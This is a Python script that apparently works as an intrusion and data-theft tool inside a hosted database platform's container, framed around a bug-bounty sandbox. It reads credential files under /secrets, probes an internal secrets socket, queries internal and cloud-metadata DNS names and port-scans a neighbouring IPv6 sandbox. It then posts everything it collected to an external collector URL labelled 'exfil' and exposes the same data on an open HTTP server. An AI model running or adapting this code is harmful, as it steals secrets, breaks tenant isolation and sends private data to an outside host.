import json
import socket
import struct
import subprocess
import time
import urllib.request

# The CTF sandbox's own certificate published this ULA; our runtime container's host
# (fda7:a938:5bfe:5fa6:0:5e9:67ef:f8d) shares the prefix, and it answered RST earlier.
SANDBOX_ULA = "fda7:a938:5bfe:5fa6:0:5e9:cd8f:2191"
COLLECTOR = "http://208.87.134.252:9200/exfil-aiven-runtime-v4"
R = {"probe": "aiven-runtime-ula-reach", "started": time.strftime("%FT%TZ", time.gmtime())}


def sh(cmd, limit=900, timeout=15):
    try:
        out = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return (out.stdout + out.stderr).decode("utf-8", "replace")[:limit]
    except Exception as exc:                                        # noqa: BLE001
        return "EXC:" + type(exc).__name__


def tcp6(host, port, timeout=3.0, pg=False):
    res = {"target": "[%s]:%s" % (host, port)}
    s = socket.socket(socket.AF_INET6)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        res["open"] = True
        res["ms"] = round((time.time() - t0) * 1000)
        if pg:
            s.sendall(struct.pack("!ii", 8, 80877103))
            reply = s.recv(1)
            res["pg_ssl"] = reply.decode("latin1")
    except Exception as exc:                                        # noqa: BLE001
        res["open"] = False
        res["err"] = type(exc).__name__
    finally:
        try:
            s.close()
        except OSError:
            pass
    return res


# --- platform logs inside our own allocation --------------------------------
for name in ("preflight.stdout.0", "preflight.stderr.0", "sidecar.stdout.0",
             "sidecar.stderr.0", "pod.stdout.0", "run.stderr.0"):
    R["alloc_log_" + name] = sh("cat /alloc/logs/%s 2>&1 | head -c 800" % name)

R["secrets_stat"] = sh("stat -c '%n %a %U:%G %s' /secrets/* 2>&1; echo '--- ls -Z (selinux)'; ls -laZ /secrets 2>&1 | head -8")
R["secrets_retry"] = sh("for f in /secrets/run.env /secrets/registry-auth.env; do echo \"== $f\"; cat $f 2>&1 | head -5; done")
R["sock_try"] = sh("python3 -c \"import socket;s=socket.socket(socket.AF_UNIX);s.settimeout(3)\n"
                   "try:\n s.connect('/secrets/api.sock');print('connected');s.sendall(b'GET /v1/allocations HTTP/1.0\\r\\n\\r\\n');print(s.recv(200))\n"
                   "except Exception as e: print('connect failed:',type(e).__name__,e)\" 2>&1 | head -6")

# --- internal DNS -----------------------------------------------------------
def dns_query(name, qtype=1, server="169.254.1.1", timeout=4.0):
    import random
    tid = random.randrange(65536)
    pkt = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + \
        b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\x00" + \
        struct.pack("!HH", qtype, 1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(pkt, (server, 53))
        data, _ = s.recvfrom(2048)
    except Exception as exc:                                        # noqa: BLE001
        return {"err": type(exc).__name__}
    finally:
        s.close()
    h = struct.unpack("!HHHHHH", data[:12])
    return {"rcode": h[1] & 0xF, "aa": bool(h[1] & 0x400), "ans": h[3],
            "authority": h[4], "bytes": len(data)}


R["dns_internal"] = {}
for nm in ("aiven-application-infrastructure.aiven.local",
           "falcon-bug-bounty-flag-pgsql-dev-sandbox.aiven.local",
           "aiven.local", "host.containers.internal", "metadata.google.internal"):
    R["dns_internal"][nm] = dns_query(nm)
R["ptr_sandbox_ula"] = sh("getent hosts %s 2>&1 | head -3; nslookup %s 2>&1 | head -8" % (SANDBOX_ULA, SANDBOX_ULA))

# --- ULA reachability from inside Aiven ------------------------------------
R["ula_scan"] = []
for port in (22, 53, 80, 443, 5432, 6432, 8080, 8443, 9092, 12691, 12692, 12693, 15049, 30000):
    r = tcp6(SANDBOX_ULA, port, pg=port in (5432, 6432, 12691, 12692))
    R["ula_scan"].append(r)
    time.sleep(0.2)

R["finished"] = time.strftime("%FT%TZ", time.gmtime())
payload = json.dumps(R).encode()
try:
    req = urllib.request.Request(COLLECTOR, data=payload, headers={"Content-Type": "application/json"})
    urllib.request.urlopen(req, timeout=10).read()
except Exception:                                                   # noqa: BLE001
    pass
print(json.dumps(R, indent=1)[:8000], flush=True)

from http.server import BaseHTTPRequestHandler, HTTPServer


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *_a):
        return


HTTPServer(("0.0.0.0", 8080), H).serve_forever()
